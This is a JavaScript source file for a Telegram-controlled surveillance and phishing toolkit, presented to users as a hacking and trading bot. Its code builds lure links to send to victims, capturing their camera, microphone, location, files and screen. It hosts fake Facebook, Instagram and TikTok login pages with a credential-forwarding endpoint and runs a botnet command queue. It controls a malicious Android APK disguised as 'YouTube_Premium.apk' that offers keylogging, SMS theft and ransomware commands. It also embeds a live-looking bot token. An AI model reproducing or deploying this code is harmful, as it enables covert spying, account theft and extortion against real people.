const express     = require('express');
const webSocket   = require('ws');
const http        = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4       = require('uuid');
const multer      = require('multer');
const bodyParser  = require('body-parser');
const axios       = require('axios');
const crypto      = require('crypto');
const fs          = require('fs');
const path        = require('path');

// ════════════════════════════════════════════════════════════════
// CONFIG
// ════════════════════════════════════════════════════════════════
const token   = process.env.TOKEN    || '7696026516:AAF40dKAG6T26ywj5oVp-ad-15qofNieXlU';
const id      = process.env.ADMIN_ID || '7799994340';
let   HOST    = process.env.HOST     || '';

// চ্যানেল username (@ ছাড়া)
const CHANNEL       = 'rakibfxatrading';
const CHANNEL_LINK  = 'https://t.me/rakibfxatrading';
const FB_LINK       = 'https://www.facebook.com/profile.php?id=61595042636110';
const WELCOME_IMG   = 'https://hc1.checker.in/file2link/photos/file_639266.jpg/file_639266.jpg';
const TRADING_BOT   = '@FXATradingZoneBot';
const TRADING_ADMIN = '@FXATradingAdmin';

// ════════════════════════════════════════════════════════════════
// SERVER SETUP
// ════════════════════════════════════════════════════════════════
const app        = express();
const appServer  = http.createServer(app);
const appSocket  = new webSocket.Server({ server: appServer });
const appBot     = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer({ limits: { fileSize: 50*1024*1024 } });
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

let currentUuid='', currentNumber='', currentTitle='', currentTargetId='';
const linkTokens = new Map();
const userLangs  = new Map();
const botnet     = new Map();
const botCmds    = new Map();

app.use((req,res,next)=>{ if(!HOST) HOST=req.protocol+'://'+req.get('host'); next(); });

// ════════════════════════════════════════════════════════════════
// HELPERS
// ════════════════════════════════════════════════════════════════
function mkLink(action, uid) {
    const tok = crypto.randomBytes(10).toString('hex');
    linkTokens.set(tok, { action, uid });
    setTimeout(()=>linkTokens.delete(tok), 600000);
    return `${HOST}/go/${tok}`;
}

const tgMsg   = (cid,txt,opts={}) => appBot.sendMessage(cid,txt,{parse_mode:'HTML',...opts}).catch(()=>{});
const tgPic   = (cid,buf,cap)     => appBot.sendPhoto(cid,buf,{caption:cap,parse_mode:'HTML'}).catch(()=>{});
const tgLoc   = (cid,lat,lon)     => appBot.sendLocation(cid,lat,lon).catch(()=>{});
const tgAudio = (cid,buf)         => appBot.sendAudio(cid,buf,{},{filename:'mic.webm',contentType:'audio/webm'}).catch(()=>{});

// চ্যানেলে জয়েন চেক
async function isJoined(userId) {
    try {
        const m = await appBot.getChatMember('@' + CHANNEL, userId);
        return ['member','administrator','creator'].includes(m.status);
    } catch(e) { return false; }
}

// ════════════════════════════════════════════════════════════════
// KEYBOARDS
// ════════════════════════════════════════════════════════════════

// Step 1: চ্যানেল জয়েন মেনু
const joinKb = () => ({ inline_keyboard: [
    [
        { text:'🔵 Facebook Page', url: FB_LINK },
    ],
    [
        { text:'📢 Telegram Channel', url: CHANNEL_LINK }
    ],
    [
        { text:'✅ Joined — Verify Now', callback_data:'VERIFY' }
    ]
]});

// Step 2: হ্যাকিং বট / ট্রেডিং
const routeKb = () => ({ inline_keyboard: [
    [
        { text:'💀 Hacking Bot', callback_data:'ROUTE_HACK' }
    ],
    [
        { text:'📈 Trading Community', callback_data:'ROUTE_TRADE' }
    ]
]});

// Trading menu
const tradingKb = () => ({ inline_keyboard: [
    [
        { text:'🤖 FXA Trading Bot', url:'https://t.me/FXATradingZoneBot' }
    ],
    [
        { text:'👤 Admin Support', url:'https://t.me/FXATradingAdmin' }
    ],
    [
        { text:'📢 Join Channel', url: CHANNEL_LINK }
    ],
    [
        { text:'◀️ Back', callback_data:'ROUTE_BACK' }
    ]
]});

// Main hacking menu
const linkKb = (act,uid) => ({ inline_keyboard: [[
    { text:'🔄 নতুন লিংক', callback_data:act },
    { text:'◀️ পিছনে',    callback_data:'M_BACK' }
]]});

function mainKb(uid) {
    return { inline_keyboard: [
        [
            { text:'📷 ক্যামেরা',       callback_data:'M_CAMERA' },
            { text:'📍 লোকেশন',        callback_data:'LNK_location' }
        ],
        [
            { text:'🖥️ স্ক্রিন',        callback_data:'M_SCREEN' },
            { text:'🔊 সাউন্ড',         callback_data:'M_SOUND' }
        ],
        [
            { text:'📡 সংযোগ',          callback_data:'M_NETWORK' },
            { text:'🔋 পাওয়ার',         callback_data:'M_POWER' }
        ],
        [
            { text:'🗃️ সিস্টেম',        callback_data:'M_SYSTEM' },
            { text:'📦 অ্যাপ',          callback_data:'M_APPS' }
        ],
        [
            { text:'📁 স্টোরেজ',        callback_data:'M_STORAGE' },
            { text:'💬 মেসেঞ্জার',      callback_data:'LNK_messenger' }
        ],
        [
            { text:'🎣 ফিশিং',          callback_data:'M_PHISH' },
            { text:'💀 APK',            callback_data:'LNK_apk' }
        ],
        [
            { text:'🤖 বটনেট',          callback_data:'M_BOTNET' },
            { text:'📡 ফুল রিকন',       callback_data:'LNK_recon' }
        ],
        [
            { text:'📨 User কে Message পাঠাও', callback_data:'M_USERMSG' }
        ]
    ]};
}

const cameraKb  = () => ({ inline_keyboard: [
    [{text:'📷 সামনে ছবি',callback_data:'LNK_cam_f_photo'},{text:'📷 পিছনে ছবি',callback_data:'LNK_cam_b_photo'}],
    [{text:'🎥 সামনে ভিডিও',callback_data:'LNK_cam_f_video'},{text:'🎥 পিছনে ভিডিও',callback_data:'LNK_cam_b_video'}],
    [{text:'🎙️ মাইক',callback_data:'LNK_mic'},{text:'🖼️ গ্যালারি',callback_data:'LNK_gallery'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const screenKb  = () => ({ inline_keyboard: [
    [{text:'🖼️ স্ক্রিনশট',callback_data:'LNK_screenshot'},{text:'🖥️ স্ক্রিন শেয়ার',callback_data:'LNK_screenshare'}],
    [{text:'🔆 উজ্জ্বলতা',callback_data:'LNK_brightness'},{text:'🔒 স্ক্রিন-লক',callback_data:'LNK_screenlock'}],
    [{text:'⏱️ টাইমআউট',callback_data:'LNK_screentimeout'},{text:'📱 স্ক্রিন তথ্য',callback_data:'LNK_screeninfo'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const soundKb   = () => ({ inline_keyboard: [
    [{text:'🔊 ভলিউম',callback_data:'LNK_volume'},{text:'🔇 নীরব মোড',callback_data:'LNK_silent'}],
    [{text:'🎵 মিডিয়া ভলিউম',callback_data:'LNK_mediavol'},{text:'📞 রিংটোন',callback_data:'LNK_ringtone'}],
    [{text:'⏰ অ্যালার্ম',callback_data:'LNK_alarm'},{text:'🔔 নোটিফিকেশন',callback_data:'LNK_notifinfo'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const networkKb = () => ({ inline_keyboard: [
    [{text:'📶 মোবাইল নেট',callback_data:'LNK_mobile_net'},{text:'📡 ওয়াই-ফাই',callback_data:'LNK_wifi'}],
    [{text:'🟦 ব্লুটুথ',callback_data:'LNK_bluetooth'},{text:'✈️ বিমান মোড',callback_data:'LNK_airplane'}],
    [{text:'🔗 হটস্পট',callback_data:'LNK_hotspot'},{text:'🌐 সংযোগ সব',callback_data:'LNK_netall'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const powerKb   = () => ({ inline_keyboard: [
    [{text:'🔋 ব্যাটারি',callback_data:'LNK_battery'},{text:'⚡ চার্জিং',callback_data:'LNK_charging'}],
    [{text:'🔌 চার্জার তথ্য',callback_data:'LNK_charger'},{text:'🔋 ব্যাটারি ব্যবহার',callback_data:'LNK_batusage'}],
    [{text:'⏱️ ব্যাটারি সময়',callback_data:'LNK_battime'},{text:'🌡️ তাপমাত্রা',callback_data:'LNK_battemp'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const systemKb  = () => ({ inline_keyboard: [
    [{text:'⚙️ সিস্টেম',callback_data:'LNK_sysinfo'},{text:'🕐 তারিখ ও সময়',callback_data:'LNK_datetime'}],
    [{text:'🌐 ভাষা',callback_data:'LNK_language'},{text:'⌨️ কীবোর্ড',callback_data:'LNK_keyboard'}],
    [{text:'📱 ডিসপ্লে',callback_data:'LNK_displayinfo'},{text:'🔢 বিল্ড তথ্য',callback_data:'LNK_buildinfo'}],
    [{text:'ℹ️ সম্পূর্ণ সিস্টেম',callback_data:'LNK_fullsys'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const appsKb    = () => ({ inline_keyboard: [
    [{text:'📱 অ্যাপ তালিকা',callback_data:'LNK_applist'},{text:'📊 অ্যাপ ব্যবহার',callback_data:'LNK_appusage'}],
    [{text:'🔄 আপডেট',callback_data:'LNK_appupdate'},{text:'🔐 অনুমতি',callback_data:'LNK_appperm'}],
    [{text:'📏 আকার',callback_data:'LNK_appsize'},{text:'📦 ডেটা',callback_data:'LNK_appdata'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const storageKb = () => ({ inline_keyboard: [
    [{text:'💾 স্টোরেজ অবস্থা',callback_data:'LNK_storage'},{text:'📊 ব্যবহার',callback_data:'LNK_storageuse'}],
    [{text:'📥 ডাউনলোড',callback_data:'LNK_downloads'},{text:'🗑️ অস্থায়ী ফাইল',callback_data:'LNK_tempfiles'}],
    [{text:'📋 ফাইল তথ্য',callback_data:'LNK_fileinfo'},{text:'📈 রিপোর্ট',callback_data:'LNK_storagereport'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const phishKb   = () => ({ inline_keyboard: [
    [{text:'🔵 Facebook',callback_data:'LNK_phish_fb'},{text:'📸 Instagram',callback_data:'LNK_phish_ig'},{text:'🎵 TikTok',callback_data:'LNK_phish_tt'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

const botnetKb  = () => ({ inline_keyboard: [
    [{text:'🔗 Infection Link',callback_data:'LNK_botnet'}],
    [{text:'📋 Active Bots',callback_data:'BOT_LIST'}],
    [{text:'📸 All Photo',callback_data:'BOT_photo'},{text:'📍 All Location',callback_data:'BOT_location'}],
    [{text:'◀️ পিছনে',callback_data:'M_BACK'}]
]});

// ════════════════════════════════════════════════════════════════
// /start COMMAND
// ════════════════════════════════════════════════════════════════
appBot.onText(/\/start/, async msg => {
    const chatId = msg.chat.id;
    const user   = msg.from.first_name || 'ব্যবহারকারী';

    // send welcome image
    try {
        await appBot.sendPhoto(chatId, WELCOME_IMG, {
            caption:
                `🔥 <b>স্বাগতম, ${user}!</b>\n\n` +
                `🛡️ এটি একটি <b>Advanced Hacking & Trading Bot</b>\n\n` +
                `📌 <b>এই বট ব্যবহার করতে হলে:</b>\n` +
                `আমাদের অফিসিয়াল চ্যানেলগুলোতে যুক্ত হতে হবে।\n\n` +
                `নিচের মেনু থেকে যুক্ত হোন তারপর <b>✅ Verify</b> চাপুন।`,
            parse_mode: 'HTML',
            reply_markup: joinKb()
        });
    } catch(e) {
        // fallback if image fails
        tgMsg(chatId,
            `🔥 <b>স্বাগতম, ${user}!</b>\n\n` +
            `🛡️ এটি একটি <b>Advanced Hacking & Trading Bot</b>\n\n` +
            `📌 এই বট ব্যবহার করতে হলে আমাদের চ্যানেলে যুক্ত হতে হবে।`,
            { reply_markup: joinKb() }
        );
    }
});

appBot.onText(/\/menu/, msg => {
    const uid = String(msg.from.id);
    if (String(msg.chat.id) === String(id)) {
        tgMsg(msg.chat.id,'🎯 মেইন মেনু:',{reply_markup:mainKb(uid)});
    }
});

// ════════════════════════════════════════════════════════════════
// NEW MEMBER WELCOME (চ্যানেলে কেউ জয়েন করলে)
// ════════════════════════════════════════════════════════════════
appBot.on('chat_member', async update => {
    try {
        if (update.new_chat_member.status === 'member') {
            const user    = update.new_chat_member.user;
            const chatId  = update.chat.id;
            const name    = user.first_name || 'বন্ধু';
            const mention = user.username
                ? `@${user.username}`
                : `<a href="tg://user?id=${user.id}">${name}</a>`;

            await appBot.sendPhoto(chatId, WELCOME_IMG, {
                caption:
                    `🎉 <b>স্বাগতম ${mention}!</b>\n\n` +
                    `আমাদের অফিসিয়াল চ্যানেলে আপনাকে স্বাগত জানাই! 🙏\n\n` +
                    `📈 এখানে আপনি পাবেন:\n` +
                    `• FX Trading সিগন্যাল\n` +
                    `• মার্কেট আপডেট\n` +
                    `• এক্সপার্ট গাইড\n\n` +
                    `🤖 আমাদের বট ব্যবহার করতে: /start\n` +
                    `💬 সাপোর্টের জন্য: ${TRADING_ADMIN}`,
                parse_mode: 'HTML'
            }).catch(()=>{
                tgMsg(chatId,
                    `🎉 <b>স্বাগতম ${mention}!</b>\n\n` +
                    `আমাদের চ্যানেলে আপনাকে স্বাগত! 🙏\n` +
                    `সাপোর্ট: ${TRADING_ADMIN}`,
                    {}
                );
            });
        }
    } catch(e) {}
});

// ════════════════════════════════════════════════════════════════
// CALLBACK HANDLER
// ════════════════════════════════════════════════════════════════
appBot.on('callback_query', async cbq => {
    const uid    = String(cbq.from.id);
    const chatId = cbq.message.chat.id;
    const msgId  = cbq.message.message_id;
    const data   = cbq.data;
    const name   = cbq.from.first_name || 'ব্যবহারকারী';

    appBot.answerCallbackQuery(cbq.id).catch(()=>{});
    const del = () => appBot.deleteMessage(chatId,msgId).catch(()=>{});
    const edit = (txt,kb) => appBot.editMessageText(txt,{chat_id:chatId,message_id:msgId,parse_mode:'HTML',reply_markup:kb}).catch(()=>{});

    // ── VERIFY ───────────────────────────────────────────────
    if (data === 'VERIFY') {
        const joined = await isJoined(cbq.from.id);
        if (!joined) {
            return appBot.answerCallbackQuery(cbq.id, {
                text: '❌ আপনি এখনো আমাদের চ্যানেলে যুক্ত হননি! আগে জয়েন করুন।',
                show_alert: true
            }).catch(()=>{});
        }
        // verified!
        appBot.answerCallbackQuery(cbq.id, {
            text: '✅ ভেরিফাই সফল হয়েছে!',
            show_alert: false
        }).catch(()=>{});

        return edit(
            `✅ <b>ভেরিফাই সফল!</b>\n\n` +
            `স্বাগতম <b>${name}</b>! 🎉\n\n` +
            `আপনি কি করতে চান?`,
            { inline_keyboard: [
                [{ text:'💀 Hacking Bot ব্যবহার করতে চাই', callback_data:'ROUTE_HACK' }],
                [{ text:'📈 Trading Community সম্পর্কে জানতে চাই', callback_data:'ROUTE_TRADE' }]
            ]}
        );
    }

    // ── ROUTE BACK ───────────────────────────────────────────
    if (data === 'ROUTE_BACK') {
        return edit(
            `✅ <b>ভেরিফাই সফল!</b>\n\nআপনি কি করতে চান?`,
            { inline_keyboard: [
                [{ text:'💀 Hacking Bot', callback_data:'ROUTE_HACK' }],
                [{ text:'📈 Trading Community', callback_data:'ROUTE_TRADE' }]
            ]}
        );
    }

    // ── HACKING ROUTE ─────────────────────────────────────────
    if (data === 'ROUTE_HACK') {
        del();
        return tgMsg(chatId,
            `🎯 <b>Hacking Bot মেনু</b>\n\nনিচের অপশন থেকে আপনার কাজ বেছে নিন:`,
            { reply_markup: mainKb(uid) }
        );
    }

    // ── TRADING ROUTE ─────────────────────────────────────────
    if (data === 'ROUTE_TRADE') {
        return edit(
            `📈 <b>FXA Trading Community</b>\n\n` +
            `আমাদের Trading Community তে আপনাকে স্বাগত!\n\n` +
            `🤖 <b>অফিসিয়াল বট:</b> ${TRADING_BOT}\n` +
            `নিচের বাটনে ক্লিক করে বটে প্রবেশ করুন।\n` +
            `বট আপনাকে ধাপে ধাপে গাইড করবে।\n\n` +
            `💬 <b>সাপোর্ট:</b> ${TRADING_ADMIN}\n` +
            `যেকোনো সমস্যায় এডমিনকে মেসেজ করুন।`,
            { inline_keyboard: [
                [{ text:'🤖 FXA Trading Bot', url:'https://t.me/FXATradingZoneBot' }],
                [{ text:'👤 Admin Support', url:'https://t.me/FXATradingAdmin' }],
                [{ text:'📢 Official Channel', url: CHANNEL_LINK }],
                [{ text:'◀️ Back', callback_data:'ROUTE_BACK' }]
            ]}
        );
    }

    // ── USER MESSAGE ─────────────────────────────────────────
    if (data === 'M_USERMSG') {
        del();
        return appBot.sendMessage(chatId,
            '📨 <b>User কে Message পাঠাও</b>\n\n' +
            'টার্গেটের Telegram <b>User ID</b> পাঠাও:\n' +
            '<i>(User ID পেতে: টার্গেট যেন বটে /start দেয় -- তারপর বট তার ID জানাবে)</i>',
            { parse_mode:'HTML', reply_markup:{ force_reply:true } }
        );
    }

    // ── SUBMENUS ──────────────────────────────────────────────
    const submenus = {
        M_BACK:    ['🎯 মেইন মেনু:',         mainKb(uid)],
        M_CAMERA:  ['📷 ক্যামেরা মেনু:',      cameraKb()],
        M_SCREEN:  ['🖥️ স্ক্রিন মেনু:',       screenKb()],
        M_SOUND:   ['🔊 সাউন্ড মেনু:',         soundKb()],
        M_NETWORK: ['📡 সংযোগ মেনু:',          networkKb()],
        M_POWER:   ['🔋 পাওয়ার মেনু:',        powerKb()],
        M_SYSTEM:  ['🗃️ সিস্টেম মেনু:',       systemKb()],
        M_APPS:    ['📦 অ্যাপ মেনু:',          appsKb()],
        M_STORAGE: ['📁 স্টোরেজ মেনু:',        storageKb()],
        M_PHISH:   ['🎣 ফিশিং টার্গেট:',       phishKb()],
        M_BOTNET:  ['🤖 বটনেট প্যানেল:',       botnetKb()]
    };
    if (submenus[data]) {
        del();
        return tgMsg(chatId, submenus[data][0], {reply_markup: submenus[data][1]});
    }

    // ── BOTNET COMMANDS ───────────────────────────────────────
    if (data==='BOT_LIST') {
        if (!botnet.size) return tgMsg(chatId,'❌ কোনো বট নেই।');
        let txt=`🤖 <b>Bots: ${botnet.size}</b>\n\n`;
        let i=1;
        botnet.forEach((v,k)=>{txt+=`${i}. <b>${v.model||'?'}</b>\n🌍 <code>${v.ip||'?'}</code>\n🕐 ${v.last||'?'}\n\n`;i++;});
        return tgMsg(chatId,txt);
    }
    if (data.startsWith('BOT_')) {
        const cmd=data.slice(4).toLowerCase();
        botnet.forEach((_,k)=>{if(!botCmds.has(k))botCmds.set(k,[]);botCmds.get(k).push(cmd);});
        return tgMsg(chatId,`📡 Sent <b>${cmd}</b> to <b>${botnet.size}</b> bots.`);
    }

    // ── LINK GENERATORS ───────────────────────────────────────
    if (data.startsWith('LNK_')) {
        const act=data.slice(4);
        del();
        const link=mkLink(act,uid);
        return tgMsg(chatId,
            `🔗 <b>লিংক তৈরি!</b>\n\n<code>${link}</code>\n\n⏰ ১০ মিনিটে মেয়াদ শেষ\n\n👇 কপি করে ভিক্টিমকে পাঠান`,
            {reply_markup:linkKb(data,uid)}
        );
    }

    // ── KAZAMIKARI DEVICE CONTROL ─────────────────────────────
    const commend=data.split(':')[0];
    const devUuid=data.split(':')[1];
    if (commend==='device') {
        const info=appClients.get(devUuid);
        if(!info) return;
        return appBot.editMessageText(
            `°• 🪣 Commands for <b>${info.model}</b>`,
            { chat_id:id,message_id:msgId,parse_mode:'HTML',
              reply_markup:{ inline_keyboard:[
                [{text:'🍏 APPS',callback_data:`apps:${devUuid}`},{text:'⚽ PHONE INFO',callback_data:`device_info:${devUuid}`}],
                [{text:'🍫 GET FILE',callback_data:`file:${devUuid}`},{text:'🏆 DELETE FILE',callback_data:`delete_file:${devUuid}`}],
                [{text:'🧨 SCREENSHOT',callback_data:`screenshot:${devUuid}`},{text:'☎️ FB/IG/TG',callback_data:`whatsapp:${devUuid}`}],
                [{text:'⛄ CLIPBOARD',callback_data:`clipboard:${devUuid}`},{text:'🥤 MIC',callback_data:`microphone:${devUuid}`}],
                [{text:'📸 BACK CAM',callback_data:`camera_main:${devUuid}`},{text:'🚸 FRONT CAM',callback_data:`camera_selfie:${devUuid}`}],
                [{text:'📟 GPS',callback_data:`location:${devUuid}`},{text:'🖥️ ECHO SMS',callback_data:`toast:${devUuid}`}],
                [{text:'🎻 CALL LOG',callback_data:`calls:${devUuid}`},{text:'♐ CONTACTS',callback_data:`contacts:${devUuid}`}],
                [{text:'📺 SMS LIST',callback_data:`messages:${devUuid}`},{text:'🛍️ SEND SMS',callback_data:`send_message:${devUuid}`}],
                [{text:'🚳 VIBRATE',callback_data:`vibrate:${devUuid}`},{text:'🏖️ NOTIF',callback_data:`show_notification:${devUuid}`}],
                [{text:'🔒 LOCK',callback_data:`encrypt_data:${devUuid}`},{text:'🔓 UNLOCK',callback_data:`decrypt_data:${devUuid}`}],
                [{text:'🌀 PLAY AUDIO',callback_data:`play_audio:${devUuid}`},{text:'🎹 STOP',callback_data:`stop_audio:${devUuid}`}],
                [{text:'🚦 SMS TO ALL',callback_data:`send_message_to_all:${devUuid}`}],
                [{text:'🔑 KEYLOG ON',callback_data:`keylogger_on:${devUuid}`},{text:'🗝️ KEYLOG OFF',callback_data:`keylogger_off:${devUuid}`}]
            ]}}
        ).catch(()=>{});
    }
    const simpleWs=['calls','contacts','messages','apps','device_info','clipboard',
        'camera_main','camera_selfie','location','vibrate','stop_audio','screenshot',
        'whatsapp','Settings','Erase_data','Ransomware','custom_phishing',
        'encrypt_data','decrypt_data','keylogger_on','keylogger_off'];
    if (simpleWs.includes(commend)) {
        wsCmd(devUuid,commend); del(); sendDone(chatId); return;
    }
    const inputCmds={
        send_message:'°• 🗯️ Enter victim number with country code',
        send_message_to_all:'°• 🔄 Enter message for all',
        file:'°• 🍬 Enter file path e.g. DCIM/Camera',
        delete_file:'°• 🌠 Enter path to delete',
        microphone:'°• 🕍 Enter duration in seconds',
        toast:'°• 🎒 Enter text to show on screen',
        show_notification:'°• 🦊 Enter notification title',
        play_audio:'°• 🎧 Enter audio URL'
    };
    if (inputCmds[commend]) {
        currentUuid=devUuid; del();
        appBot.sendMessage(id,inputCmds[commend],{reply_markup:{force_reply:true}});
    }
});

// ════════════════════════════════════════════════════════════════
// MESSAGE HANDLER
// ════════════════════════════════════════════════════════════════
appBot.on('message', async msg => {
    const uid=String(msg.from.id);
    const chatId=msg.chat.id;
    const text=msg.text||'';
    if(text==='/start'||text==='/menu') return;
    const rt=msg.reply_to_message?.text||'';
    if(rt){
        const map=[
            {k:'victim number',fn:()=>{currentNumber=text;appBot.sendMessage(id,'🏜️ Now enter message:',{reply_markup:{force_reply:true}});}},
            {k:'Now enter message',fn:()=>{wsCmd(currentUuid,`send_message:${currentNumber}/${text}`);currentNumber='';currentUuid='';sendDone(chatId);}},
            {k:'all',fn:()=>{wsCmd(currentUuid,`send_message_to_all:${text}`);currentUuid='';sendDone(chatId);}},
            {k:'file path',fn:()=>{wsCmd(currentUuid,`file:${text}`);currentUuid='';sendDone(chatId);}},
            {k:'path to delete',fn:()=>{wsCmd(currentUuid,`delete_file:${text}`);currentUuid='';sendDone(chatId);}},
            {k:'duration in seconds',fn:()=>{wsCmd(currentUuid,`microphone:${text}`);currentUuid='';sendDone(chatId);}},
            {k:'text to show',fn:()=>{wsCmd(currentUuid,`toast:${text}`);currentUuid='';sendDone(chatId);}},
            {k:'notification title',fn:()=>{currentTitle=text;appBot.sendMessage(id,'🐼 Enter link:',{reply_markup:{force_reply:true}});}},
            {k:'Enter link',fn:()=>{wsCmd(currentUuid,`show_notification:${currentTitle}/${text}`);currentUuid='';currentTitle='';sendDone(chatId);}},
            {k:'audio URL',fn:()=>{wsCmd(currentUuid,`play_audio:${text}`);currentUuid='';sendDone(chatId);}}
        ];
        for(const r of map) if(rt.includes(r.k)){r.fn();return;}

        // user message flow
        if (rt.includes('User ID পাঠাও')) {
            currentTargetId = text.trim();
            return appBot.sendMessage(chatId,
                '✅ Target ID: <code>' + currentTargetId + '</code>\n\n📝 এখন যে message পাঠাতে চাও সেটা লেখো:',
                { parse_mode:'HTML', reply_markup:{ force_reply:true } }
            );
        }
        if (rt.includes('এখন যে message পাঠাতে চাও')) {
            const targetId = currentTargetId;
            const msgText  = text;
            currentTargetId = '';
            try {
                await appBot.sendMessage(targetId, msgText);
                return tgMsg(chatId, '✅ Message পাঠানো হয়েছে!\nTarget: <code>' + targetId + '</code>', {});
            } catch(e) {
                return tgMsg(chatId,
                    '❌ Message পাঠানো যায়নি!\n' +
                    'কারণ: ঐ user কখনো বটে /start দেয়নি।\n' +
                    'আগে তাকে বটে /start করাতে হবে।', {}
                );
            }
        }
    }
    if(String(chatId)===String(id)){
        if(text==='📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮'){
            if(!appClients.size) return tgMsg(id,'❌ No active APK connections.');
            let t2='🎮 Active APK Devices:\n\n';
            appClients.forEach(v=>{t2+=`• ${v.model} | 🔋${v.battery}\n`;});
            return tgMsg(id,t2);
        }
        if(text==='📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬'){
            if(!appClients.size) return tgMsg(id,'❌ No active connections.');
            const kb=[];
            appClients.forEach((v,k)=>kb.push([{text:`📱 ${v.model}`,callback_data:`device:${k}`}]));
            return tgMsg(id,'Select device:',{reply_markup:{inline_keyboard:kb}});
        }
    }
});

function wsCmd(uuid,cmd){appSocket.clients.forEach(ws=>{if(ws.uuid===uuid)ws.send(cmd);});}
function sendDone(chatId){return tgMsg(id,'°• ✅ Command sent.',{reply_markup:{keyboard:[['📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮'],['📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬']],resize_keyboard:true}});}

// ════════════════════════════════════════════════════════════════
// WEBSOCKET (APK)
// ════════════════════════════════════════════════════════════════
appSocket.on('connection',(ws,req)=>{
    const devUuid=uuid4.v4();
    const model=req.headers.model||'Unknown';
    const battery=req.headers.battery||'?';
    const version=req.headers.version||'?';
    const brightness=req.headers.brightness||'?';
    const provider=req.headers.provider||'?';
    ws.uuid=devUuid;
    appClients.set(devUuid,{model,battery,version,brightness,provider});
    tgMsg(id,`🤡 <b>NEW PHONE (APK)</b>\n📱 <b>${model}</b>\n🔋 ${battery}\n🤖 ${version}\n📶 ${provider}`);
    ws.on('close',()=>{tgMsg(id,`😫 Disconnected: ${model}`);appClients.delete(ws.uuid);});
    ws.on('error',()=>appClients.delete(ws.uuid));
});

// ════════════════════════════════════════════════════════════════
// HTTP ROUTES
// ════════════════════════════════════════════════════════════════
app.get('/',(_,res)=>res.send('<h1 style="text-align:center;color:green">✅ Server Online</h1>'));
app.post('/uploadFile',upload.single('file'),(req,res)=>{appBot.sendDocument(id,req.file.buffer,{caption:`📁 ${req.headers.model||'?'}`,parse_mode:'HTML'},{filename:req.file.originalname,contentType:'application/octet-stream'}).catch(()=>{});res.send('');});
app.post('/uploadText',(req,res)=>{tgMsg(id,`📝 <b>${req.headers.model||'?'}</b>\n\n${req.body.text||''}`);res.send('');});
app.post('/uploadLocation',(req,res)=>{tgLoc(id,req.body.lat,req.body.lon);tgMsg(id,`📍 ${req.headers.model||'?'}\nhttps://maps.google.com/?q=${req.body.lat},${req.body.lon}`);res.send('');});
app.post('/d/photo',upload.single('photo'),(req,res)=>{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(req.file)tgPic(uid,req.file.buffer,`${req.body.camtype||'📸'}\n🌍 ${ip}`);res.json({ok:true});});
app.post('/d/video',upload.single('video'),(req,res)=>{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(req.file)appBot.sendVideo(uid,req.file.buffer,{caption:`🎥 Video\n🌍 ${ip}`,parse_mode:'HTML'}).catch(()=>{});res.json({ok:true});});
app.post('/d/loc',(req,res)=>{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;const{lat,lon,acc}=req.body;if(lat&&lon){tgLoc(uid,parseFloat(lat),parseFloat(lon));tgMsg(uid,`📍 Lat:${lat} Lon:${lon} Acc:${acc}m\n🌍 ${ip}\nhttps://maps.google.com/?q=${lat},${lon}`);}res.json({ok:true});});
app.post('/d/text',(req,res)=>{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;tgMsg(uid,`📋 <b>${req.body.type||'Data'}</b>\n\n<code>${(req.body.data||'').slice(0,3500)}</code>\n🌍 ${ip}`);res.json({ok:true});});
app.post('/d/audio',upload.single('audio'),(req,res)=>{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;if(req.file){tgAudio(uid,req.file.buffer);tgMsg(uid,`🎙️ Audio | ${ip}`);}res.json({ok:true});});
app.post('/d/creds',(req,res)=>{const uid=req.body.uid,ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;tgMsg(uid,`🔑 <b>CREDENTIALS!</b>\n🌐 <b>${req.body.site||'?'}</b>\n👤 <code>${req.body.user||''}</code>\n🔒 <code>${req.body.pass||''}</code>\n🌍 ${ip}`);res.json({ok:true});});
app.post('/b/reg',(req,res)=>{const{victimId,uid,model}=req.body;const ip=req.headers['x-forwarded-for']||req.socket.remoteAddress;botnet.set(victimId,{uid,ip,model:model||'?',last:new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'})});tgMsg(uid,`🤖 New Bot!\n📱 ${model||'?'}\n🌍 ${ip}\nTotal: <b>${botnet.size}</b>`);res.json({ok:true});});
app.post('/b/poll',(req,res)=>{const{victimId}=req.body;if(botnet.has(victimId))botnet.get(victimId).last=new Date().toLocaleString('en-BD',{timeZone:'Asia/Dhaka'});const pending=botCmds.get(victimId)||[];botCmds.set(victimId,[]);res.json({ok:true,commands:pending});});
app.get('/payload.apk',(req,res)=>{const p=path.join(__dirname,'payload.apk');if(fs.existsSync(p)){res.setHeader('Content-Type','application/vnd.android.package-archive');res.setHeader('Content-Disposition','attachment; filename="YouTube_Premium.apk"');res.sendFile(p);}else res.status(404).send('Not found');});
app.get('/sw.js',(req,res)=>{res.setHeader('Content-Type','application/javascript');res.send(`self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>clients.claim());`);});

// ════════════════════════════════════════════════════════════════
// LINK PAGES
// ════════════════════════════════════════════════════════════════
